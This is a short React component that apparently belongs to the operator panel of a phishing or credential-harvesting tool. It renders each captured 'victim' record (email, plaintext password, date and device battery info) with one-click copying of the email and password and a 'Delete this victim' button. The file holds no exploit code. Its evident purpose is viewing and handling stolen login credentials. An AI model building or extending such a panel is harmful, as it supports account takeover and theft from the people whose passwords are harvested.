import React, { useState } from 'react'
import 'boxicons'
import { copyToClipboard, deleteUser } from './Database';

function Box(props) {
    const {email , password , chargerInfo , id , date} = props.data
    const [textToCopy, setTextToCopy] = useState('Hello, world!');

    
  return (
    <div className='shadow md:w-[30rem] w-full p-3 rounded border-green-500 border gap-2 flex flex-col'>
        <div className="email cursor-pointer border p-2" onClick={()=>copyToClipboard(email)}>
        <box-icon name='mail-send'></box-icon>
        <p className="mail">
            {email}
        </p>
        </div>
        <div className="pass cursor-pointer border p-2" onClick={()=>copyToClipboard(password)}>
        <box-icon name='lock-open'></box-icon>
        <p className="password" >
            {password}
        </p>
        </div>

        <div className="date cursor-pointer border p-2">
        <box-icon type='solid' name='calendar'></box-icon>
        <p>{date}</p>
        </div>

        <div className="batteryinfo cursor-pointer border p-2">
        <box-icon type='solid' name='battery-charging'></box-icon>
            <p className="b-info">
            {chargerInfo}
            </p>
        <button
        onClick={()=> deleteUser(id)}
         className='flex bg-green-500 text-white mt-3 w-full items-center justify-center p-3 rounded'>
        <box-icon name='trash' color={'#fff'} ></box-icon>
        <p>Delete this victim</p>
        </button>
        </div>
    </div>
  )
}

export default Box
